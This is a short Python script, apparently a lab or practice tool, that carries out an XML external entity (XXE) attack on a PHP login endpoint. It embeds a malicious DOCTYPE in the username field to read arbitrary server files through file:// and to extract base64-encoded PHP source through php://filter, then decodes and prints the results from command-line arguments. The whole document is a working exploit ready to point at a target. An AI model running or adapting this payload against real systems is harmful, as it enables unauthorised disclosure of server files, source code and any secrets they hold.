import argparse
import base64
import xml.etree.ElementTree as ET
import requests

URL = 'http://www.phpxxe.com/doLogin.php'
HEADERS = {'Content-Type': 'application/xml;charset=UTF-8', 'Accept': 'application/xml, text/xml'}
CONTENT = '<!DOCTYPE a[' \
      '<!ENTITY xxe SYSTEM "{string}">' \
      ']>' \
      '<user><username>&xxe;</username><password>admin</password></user>'

PATH = 'file:///{path}'
SOURCE_CODE = 'php://filter/read=convert.base64-encode/resource={name}'


def send_request(is_file, string):
    if is_file:
        response = requests.post(url=URL, data=CONTENT.format(string=PATH.format(path=string)), json=HEADERS)
    else:
        response = requests.post(url=URL, data=CONTENT.format(string=SOURCE_CODE.format(name=string)), json=HEADERS)
    return response.content.decode('utf-8')


def parse_response(is_file, string):
    root = ET.fromstring(string)
    # find the returned message
    result = root.find('msg').text
    # decode
    if not is_file:
        result = base64.b64decode(result).decode('utf-8')
    return result


def perform_xxe(is_file, string):
    response = send_request(is_file, string)
    return parse_response(is_file, response)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XXE invoker')
    parser.add_argument('--file', type=str, help='Get file content of given path')
    parser.add_argument('--code', type=str, help='Get source code of website')
    args = parser.parse_args()

    if args.file:
        print('Performing XXE to get file content...\n\n', perform_xxe(True, args.file))
    if args.code:
        print('Performing XXE to get source code...\n\n', perform_xxe(False, args.code))
